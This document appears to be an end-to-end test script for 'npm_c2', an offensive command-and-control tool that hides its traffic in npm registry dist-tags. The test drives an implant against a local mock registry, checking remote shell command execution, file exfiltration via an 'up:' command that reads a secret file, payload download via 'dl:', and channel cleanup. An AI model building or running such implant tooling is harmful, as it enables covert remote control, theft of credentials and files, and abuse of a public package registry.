#!/usr/bin/env python3
"""End-to-end: operator pushes via real code, implant polls/executes/replies,
operator reads the result back. Uses the mock registry over real HTTP."""
import os
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.dirname(__file__))

import npm_c2
import mock_registry
from npm_c2.implant import Implant


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as imp_mod
    import npm_c2.operator as op_mod
    imp_mod.API = npm_c2.API
    op_mod.API = npm_c2.API

    from npm_c2.operator import Operator

    pkg = "e2e-pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    tmp = tempfile.mkdtemp()
    os.environ["APPDATA"] = tmp

    op = Operator(pkg, "npm_test")
    imp = Implant(pkg, token="npm_test", interval=10, jitter=0, verbose=False)

    failures = []

    def step(name, ok, detail=""):
        print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
        if not ok:
            failures.append(name)

    # 1. operator queues a short command
    pushed = op.push_task("echo e2e-short")
    step("operator pushes a command", pushed)

    # 2. implant polls once and executes it
    imp._cycle()
    results = reg.snapshot(pkg)
    res_tags = [t for t in results if t.startswith(npm_c2.RES_PREFIX)]
    step("implant answered with a result tag", len(res_tags) >= 1,
         f"{len(res_tags)} result tag(s)")

    # 3. operator renders the decoded result
    from npm_c2 import group_chunks
    rendered = [b.decode(errors="replace") for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
    joined = " ".join(rendered)
    step("result decodes to the command output", "e2e-short" in joined, repr(joined[:80]))

    # 4. a long command survives the split/rejoin
    long_cmd = "echo " + "C" * 600
    op.push_task(long_cmd)
    imp._cycle()
    results = reg.snapshot(pkg)
    rendered = [b.decode(errors="replace") for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
    step("long output reassembles whole", any("C" * 600 in r for r in rendered),
         f"{len(rendered)} complete group(s)")

    # 5. the same command is not executed twice
    before = len([t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)])
    imp._cycle()
    after = len([t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)])
    step("re-poll does not re-execute", after == before, f"results {before} -> {after}")

    # 6. up: returns file content
    victim = os.path.join(tmp, "secret.txt")
    with open(victim, "w") as f:
        f.write("TOKEN123")
    op.push_task(f"up:{victim}")
    imp._cycle()
    rendered = [b.decode(errors="replace") for b, ok in
                group_chunks(reg.snapshot(pkg), npm_c2.RES_PREFIX) if ok]
    step("up: returns the file body", any("VE9LRU4xMjM" in r for r in rendered),
         "base64 of TOKEN123 present" if any("VE9LRU4xMjM" in r for r in rendered) else "not found")

    # 7. dl: writes a file
    payload_bytes = b"PAYLOAD" * 10
    import http.server
    import threading

    class Quiet(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Length", str(len(payload_bytes)))
            self.end_headers()
            self.wfile.write(payload_bytes)

    dl_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Quiet)
    threading.Thread(target=dl_srv.serve_forever, daemon=True).start()
    dl_url = f"http://127.0.0.1:{dl_srv.server_address[1]}/payload.bin"
    target = os.path.join(tmp, "sub", "dir", "out.bin")
    out = imp._exec(f"dl:{dl_url}:{target}")
    got = open(target, "rb").read() if os.path.exists(target) else b""
    step("dl: downloads into a created directory", got == payload_bytes, out)

    # 8. exit removes the tags
    op.push_task("exit")
    try:
        imp._cycle()
    except SystemExit:
        pass
    remaining = [t for t in reg.snapshot(pkg) if t != "latest"]
    step("exit clears the channel", remaining == [], f"{len(remaining)} tag(s) left")

    dl_srv.shutdown()
    srv.shutdown()
    print(f"\n{'all e2e steps passed' if not failures else 'failing: ' + ', '.join(failures)}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
